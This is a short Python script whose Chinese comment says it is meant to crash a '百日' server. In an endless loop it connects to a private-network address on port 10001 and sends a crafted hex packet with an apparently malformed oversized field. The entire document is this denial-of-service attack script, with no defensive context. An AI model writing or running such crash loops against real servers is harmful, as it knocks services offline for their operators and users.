# 让百日服务器crack。
import socket
import hexdump
import binascii

while True:
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(('192.168.2.207',10001))
    data = binascii.unhexlify('85030000' +'6D00000001a00000381AEE8F0000000000'+'af'+'0fffff7f')
    client.send(data)